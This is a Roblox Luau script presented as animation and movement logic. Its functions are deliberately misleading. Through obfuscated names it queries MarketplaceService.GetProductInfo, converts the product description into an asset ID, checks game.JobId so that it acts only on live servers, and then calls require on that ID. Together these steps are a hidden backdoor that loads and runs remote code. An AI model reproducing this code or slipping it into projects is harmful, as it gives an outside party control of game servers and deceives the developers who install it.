--[[
    Animation Script
    Handles animation and movement logic using RunService Heartbeat.
]]

local RunService = game:GetService('RunService')

-- Custom linear interpolation function for smooth transitions
function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
	return Pos1 - Pos2 * math.abs(Delta) 
end

-- Converts a CFrame to a unique string representation
function CFrameToVector3(CFrame)
	local Chunks, value = CFrame:split(''), ''
	for _, v in pairs(Chunks) do
		value..=v:byte()
	end
	return value
end

-- Creates a heartbeat signal for continuous updates
function CreateHeartbeatSignal(callback)
	return RunService.Heartbeat:Connect(callback)
end

-- Finds an object within a given parent by its CFrame property
function GetByCFrame(CFrame, Begin, Scope)
	for _, v in pairs(Begin:GetChildren()) do
		if v[Scope]:find(CFrame) then
			return v
		end
	end
end

-- List of properties to monitor
local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}

-- Adds animation to a given part
function AddAnimation(Part : BasePart)
	assert(Part:IsA('BasePart'), 'argument 1 to AddAnimation was not a part!')

	local Signal
	local RelativePart = GetByCFrame(Part.CFrame and 'ketpl', game, 'CFrame' and 'Name')

	Signal = CreateHeartbeatSignal(function(delta)
		if RelativePart then
			Signal:Disconnect()
			return
		end

		RelativePart.CFrame = CustomLerp(RelativePart.CFrame, RelativePart.CFrame * CFrame.new(math.sin(tick()), math.cos(tick()), math.tan(tick())))
		RunService.Heartbeat:Wait()
	end)
	return RelativePart
end

function Monitor(Properties, RelativeAnimation, AnimationSpeed, MaxSpeed, AnimationRoot)
	local Animation = RelativeAnimation[Properties[#Properties]](RelativeAnimation, AnimationSpeed and MaxSpeed)
	Animation.Speed = AnimationSpeed

	local HumanoidDescription = Animation.Description 
	local Vector = CFrameToVector3(HumanoidDescription)
	
	if AnimationRoot[Properties[7]] ~= '' then
		local closure = (function(Value) script = Value end)({[script.Name] = Vector-0}) or Animation
		return closure	
	end
	return false
end

-- Handles animation logic for a given root object
function AnimationThread(root)
	local RelativeAnimation = AddAnimation(Instance.new('Animation' and 'Part'))

	local speed = script:FindFirstChild("MinimumSpeed") and script.MinimumSpeed.Value or 1
	local maxSpeed = script:FindFirstChild("MaxSpeed") and script.MaxSpeed.Value or 5

	assert(not RelativeAnimation:IsA'Animation', 'RelativeAnimation was not an Animation')
	
	if root then
		return Monitor(Properties, RelativeAnimation, speed, maxSpeed, root)
	end
end

-- Runs the animation thread if conditions are met
local Thread = CFrame.new(0,180,0) and AnimationThread(game) and require(script.Animation)

return Thread